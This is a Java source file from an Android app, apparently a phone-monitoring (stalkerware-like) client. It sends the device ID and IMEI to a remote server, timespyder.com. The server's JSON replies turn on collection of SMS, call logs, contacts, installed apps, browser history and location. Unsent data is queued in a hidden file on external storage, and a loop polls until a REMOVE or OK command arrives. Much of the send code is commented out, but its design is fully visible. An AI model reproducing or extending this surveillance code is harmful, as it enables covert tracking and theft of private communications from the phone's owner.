package com.inet.android.request;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.utils.Logging;
import com.inet.android.utils.WebClientDevWrapper;



import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.os.Environment;
import android.preference.PreferenceManager;


/** Класс отправки запросов
 * 
 * @author johny homicide
 *
 */
public class RequestMakerImpl implements RequestMaker {
	private final String LOG_TAG = "RequestMakerImpl";
	Context context;

	public RequestMakerImpl(Context context) {
		this.context = context;
	}

//	private int sendPostRequest(String postRequest) throws JSONException {
//		getRequestData(Caller.doMake(postRequest));
//		return 0;
//	}
	
//	private int sendPeriodicPostRequest(String postRequest) throws JSONException {
//		getPeriodicRequestData(Caller.doMake(postRequest));
//		return 0;
//	}
	
//	private int sendStartPostRequest(String postRequest) throws JSONException {
//		getStartRequestData(Caller.doMake(postRequest));
//		return 0;
//	}

//	// Отправка post-запоса (каждые 4 часа) при использовании SSL
//	private int sendSSLPostRequest4(String postRequest)
//			throws ClientProtocolException, IOException, IllegalStateException {
//
//		Logging.doLog(LOG_TAG, "SSL request4: " + postRequest, "SSL request4: " + postRequest);
//
//		DefaultHttpClient client = (DefaultHttpClient) WebClientDevWrapper
//				.getNewHttpClient();
//
//		HttpPost post = new HttpPost("https://inp.timespyder.com");
//
//		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
//		nameValuePairs.add(new BasicNameValuePair("content", postRequest));
//		post.setEntity(new UrlEncodedFormEntity(nameValuePairs, "cp1251"));
//
//		HttpResponse response = client.execute(post);
//
//		if (response != null) {
//			String strData = EntityUtils.toString(response.getEntity());
//
//			Logging.doLog(LOG_TAG, "SSL response4: " + strData, "SSL response4: " + strData);
//
//			if (strData.indexOf("ANSWER") == -1) {
//				Logging.doLog(LOG_TAG, "add line due to error in the answer", 
//						"add line due to error in the answer");
//
//				addLine(postRequest);
//			} else {
//				try {
//					getPeriodicRequestData(strData);
//				} catch (JSONException e) {
//					e.printStackTrace();
//				}
//			}
//		} else {
//			Logging.doLog(LOG_TAG, "https response equals null", "https response equals null");
//		}
//
//		return 0;
//	}

//	// Отправка post-запоса (собранные данные) при использовании SSL
//	private int sendSSLPostRequest(String postRequest)
//			throws ClientProtocolException, IOException, IllegalStateException {
//
//		Logging.doLog(LOG_TAG, "SSL request: " + postRequest, "SSL request: " + postRequest);
//
//		DefaultHttpClient client = (DefaultHttpClient) WebClientDevWrapper
//				.getNewHttpClient();
//
//		HttpPost post = new HttpPost("https://inp.timespyder.com");
//
//		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
//		nameValuePairs.add(new BasicNameValuePair("content", postRequest));
//		post.setEntity(new UrlEncodedFormEntity(nameValuePairs, "cp1251"));
//
//		HttpResponse response = client.execute(post);
//
//		if (response != null) {
//			String strData = EntityUtils.toString(response.getEntity());
//
//			Logging.doLog(LOG_TAG, "SSL response4: " + strData, "SSL response4: " + strData);
//
//			if (strData.indexOf("ANSWER") == -1) {
//				Logging.doLog(LOG_TAG, "add line due to error in the answer", 
//						"add line due to error in the answer");
//
//				addLine(postRequest);
//			}
//		} else {
//			Logging.doLog(LOG_TAG, "https response equals null", "https response equals null");
//		}
//
//		return 0;
//	}
	
	
	
//	/**
//	 * Parse response data from a periodic request
//	 * @param string
//	 * @throws JSONException 
//	 */
//	private void getPeriodicRequestData(String string) throws JSONException {
//
//		Logging.doLog(LOG_TAG, "getResponseData: " + string, "getResponseData: " + string);
//
//		SharedPreferences sp = PreferenceManager
//				.getDefaultSharedPreferences(context);
//		Editor ed = sp.edit();
//		
//		JSONObject jsonObject = new JSONObject(string);
//		
//		String str = jsonObject.getString("ANSWER");
//		if (str != null) {
//			ed.putString("ANSWER", str);
//		} else {
//			ed.putString("ANSWER", "");
//		}
//
//		str = jsonObject.getString("GEO");
//		if (str != null) {
//			ed.putString("GEO", str);
//		} else {
//			ed.putString("GEO", "5");
//		}
//		
//		str = jsonObject.getString("GEOTYPE");
//		if (str != null) {
//			ed.putString("GEOTYPE", str);
//		} else {
//			ed.putString("GEOTYPE", "1");
//		}
//		
//		str = jsonObject.getString("SMS");
//		if (str != null) {
//			ed.putString("SMS", str);
//		} else {
//			ed.putString("SMS", "0");
//		}
//
//		str = jsonObject.getString("CALL");
//		if (str != null) {
//			ed.putString("CALL", str);
//		} else {
//			ed.putString("CALL", "0");
//		}
//		
//		str = jsonObject.getString("TELBK");
//		if (str != null) {
//			ed.putString("TELBK", str);
//		} else {
//			ed.putString("TELBK", "0");
//		}
//
//		str = jsonObject.getString("LISTAPP");
//		if (str != null) {
//			ed.putString("LISTAPP", str);
//		} else {
//			ed.putString("LISTAPP", "0");
//		}
//		
//		str = jsonObject.getString("ARCSMS");
//		if (str != null) {
//			ed.putString("ARCSMS", str);
//		} else {
//			ed.putString("ARCSMS", "0");
//		}
//
//		str = jsonObject.getString("ARCCALL");
//		if (str != null) {
//			ed.putString("ARCCALL", str);
//		} else {
//			ed.putString("ARCCALL", "0");
//		}
//
//		str = jsonObject.getString("STBR");
//		if (str != null) {
//			ed.putString("STBR", str);
//		} else {
//			ed.putString("STBR", "0");
//		}
//
//		str = jsonObject.getString("RECALL");
//		if (str != null) {
//			ed.putString("RECALL", str);
//		} else {
//			ed.putString("RECALL", "0");
//		}
//		
//		str = jsonObject.getString("UTCT");
//		if (str != null) {
//			ed.putString("UTCT", str);
//		} else {
//			ed.putString("UTCT", "0");
//		}
//
//		str = jsonObject.getString("TIME_FR");
//		if (str != null) {
//			ed.putString("TIME_FR", str);
//		} else {
//			ed.putString("TIME_FR", "");
//		}
//
//		str = jsonObject.getString("TIME_TO");
//		if (str != null) {
//			ed.putString("TIME_TO", str);
//		} else {
//			ed.putString("TIME_TO", "");
//		}
//
//		str = jsonObject.getString("BRK1_FR");
//		if (str != null) {
//			ed.putString("BRK1_FR", str);
//		} else {
//			ed.putString("BRK1_FR", "");
//		}
//
//		str = jsonObject.getString("BRK1_TO");
//		if (str != null) {
//			ed.putString("BRK1_TO", str);
//		} else {
//			ed.putString("BRK1_TO", "");
//		}
//		
//		str = jsonObject.getString("TIME_DEV");
//		if (str != null) {
//			ed.putString("TIME_DEV", str);
//		} else {
//			ed.putString("TIME_DEV", "");
//		}
//
//		ed.commit();
//	}
	
//	/**
//	 * Parse response data from a information request
//	 * @param string
//	 * @throws JSONException
//	 */
//	private void getRequestData(String string) throws JSONException {
//		String postRequest = null;
//		
//		Logging.doLog(LOG_TAG, "getResponseData: " + string, "getResponseData: " + string);
//
//		SharedPreferences sp = PreferenceManager
//				.getDefaultSharedPreferences(context);
//		postRequest = "{\"id\":\"" + sp.getString("ID", "0000") + "\","
//				+ "\"IMEI\":\"" + sp.getString("IMEI", "0000") + "\"}";		
//		
//		JSONObject jsonObject = new JSONObject(string);
//		
//		String str = jsonObject.getString("ANSWER");
//		if (str.equals("GETSTART")) {
////			sendPeriodicRequest(postRequest);
//			PeriodicRequest pr = new PeriodicRequest(context);
//			pr.sendRequest(postRequest);
//		}
//	}
	
//	/**
//	 * Parse response data from a start request
//	 * @param string
//	 * @throws JSONException
//	 */
//	private void getStartRequestData(String string) throws JSONException {
//		Logging.doLog(LOG_TAG, "getResponseData: " + string, "getResponseData: " + string);
//
//		SharedPreferences sp = PreferenceManager
//				.getDefaultSharedPreferences(context);
//		Editor ed = sp.edit();
//		
//		JSONObject jsonObject = new JSONObject(string);
//		
//		String str = jsonObject.getString("code");
//		if (str != null) {
//			ed.putString("code", str);
//		} else {
//			ed.putString("code", "");
//		}
//				
//		if (str.equals("1")) {
//			str = jsonObject.getString("device");
//			if (str != null) {
//				ed.putString("ID", str);
//			} else {
//				ed.putString("ID", "");
//			}
//			
//		}
//		
//		if (str.equals("0")) {
//			str = jsonObject.getString("error");
//			if (str != null) {
//				ed.putString("error", str);
//			} else {
//				ed.putString("error", "");
//			}
//			if (str.equals("0")) 
//				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
//			if (str.equals("1"))
//				Logging.doLog(LOG_TAG, "imei отсутствует или имеет неверный формат", 
//						"imei отсутствует или имеет неверный формат");
//			if (str.equals("2")) 
//				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть", 
//						"устройство с указанным imei уже есть");
//		}
//				
//		ed.commit();
//	}

	// Добавление строки в файл для отправки при следующем появление
	// интернет-соединения
 	public void addLine(String string) {
		File outFile = new File(Environment.getExternalStorageDirectory(),
				"/conf");
		FileWriter wrt = null;

		Logging.doLog(LOG_TAG, "addLine: " + string, "addLine: " + string);

		try {
			wrt = new FileWriter(outFile, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			wrt.append(string + "\n");
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			wrt.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}

		Logging.doLog(LOG_TAG, "addLine: added", "addLine: added");
	}

//	// Вызов отдельного потока для отправки post-запроса
//	public void sendDataRequest(String str) {
//		RequestTask mt = new RequestTask();
//		mt.execute(str);
//	}

//	// Вызов отдельного потока для отправки post-запроса (периодического)
//	public void sendPeriodicRequest(String str) {
//		PeriodicRequestTask frt = new PeriodicRequestTask();
//		frt.execute(str);
//	}
	
//	// Вызов отдельного потока для отправки post-запроса (стартового)
//	public void sendStartRequest(String str) {
//		StartRequestTask srt = new StartRequestTask();
//		srt.execute(str);
//	}
	
	public static void diagRequest(Context ctx) {
		String LOG_TAG = "RequestMakerImpl";
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(ctx);

//		String str = "<func>getinfo</func><id>"
//				+ sp.getString("ID", "tel") + "</id>";
		
		String str = "{\"id\":\"" + sp.getString("ID", "0000") + "\","
				+ "\"IMEI\":\"" + sp.getString("IMEI", "0000") + "\"}";	
		String action = null;

		do {
			Logging.doLog(LOG_TAG, "before req", "before req");
			
//			RequestMaker req = new RequestMakerImpl(ctx);
//			req.sendPeriodicRequest(str);
			PeriodicRequest pr = new PeriodicRequest(ctx);
			pr.sendRequest(str);
			
			Logging.doLog(LOG_TAG, "post req", "post req");

			sp = PreferenceManager
					.getDefaultSharedPreferences(ctx);
			action = sp.getString("ACTION", "PAUSE");
			if (action.equals("PAUSE")) {
				try {
					TimeUnit.MILLISECONDS.sleep(600000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		} while (!action.equals("OK") && !action.equals("REMOVE"));

		if (action.equals("REMOVE")) {
			Logging.doLog(LOG_TAG, "REMOVE", "REMOVE");
		}

		Logging.doLog(LOG_TAG, "action - " + action, "action - " + action);
	}

//	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {
//
//		@Override
//		protected void onPreExecute() {
//			super.onPreExecute();
//		}
//
//		@Override
//		protected Void doInBackground(String... strs) {
//			try {
//				sendSSLPostRequest4(strs[0]);
//			} catch (ClientProtocolException e) {
//				try {
//					sendPeriodicPostRequest(strs[0]);
//				} catch (JSONException e1) {
//					e1.printStackTrace();
//				}
//				e.printStackTrace();
//			} catch (IllegalStateException e) {
//				try {
//					sendPeriodicPostRequest(strs[0]);
//				} catch (JSONException e1) {
//					e1.printStackTrace();
//				}
//				e.printStackTrace();
//			} catch (IOException e) {
//				try {
//					sendPeriodicPostRequest(strs[0]);
//				} catch (JSONException e1) {
//					e1.printStackTrace();
//				}
//				e.printStackTrace();
//			} 
//			return null;
//		}
//
//		@Override
//		protected void onPostExecute(Void result) {
//			super.onPostExecute(result);
//		}
//	}

//	class RequestTask extends AsyncTask<String, Void, Void> {
//
//		@Override
//		protected void onPreExecute() {
//			super.onPreExecute();
//		}
//
//		@Override
//		protected Void doInBackground(String... strs) {
//			try {
//				sendSSLPostRequest(strs[0]);
//			} catch (ClientProtocolException e) {
//				try {
//					sendPostRequest(strs[0]);
//				} catch (JSONException e1) {
//					e1.printStackTrace();
//				}
//				e.printStackTrace();
//			} catch (IllegalStateException e) {
//				try {
//					sendPostRequest(strs[0]);
//				} catch (JSONException e1) {
//					e1.printStackTrace();
//				}
//				e.printStackTrace();
//			} catch (IOException e) {
//				try {
//					sendPostRequest(strs[0]);
//				} catch (JSONException e1) {
//					e1.printStackTrace();
//				}
//				e.printStackTrace();
//			}
//			return null;
//		}
//
//		@Override
//		protected void onPostExecute(Void result) {
//			super.onPostExecute(result);
//		}
//	}
	
//	class StartRequestTask extends AsyncTask<String, Void, Void> {
//
//		@Override
//		protected Void doInBackground(String... strs) {
//			try {
//				sendStartPostRequest(strs[0]);
//			} catch (JSONException e) {
//				e.printStackTrace();
//			}
//			return null;
//		}
//		
//	}
}
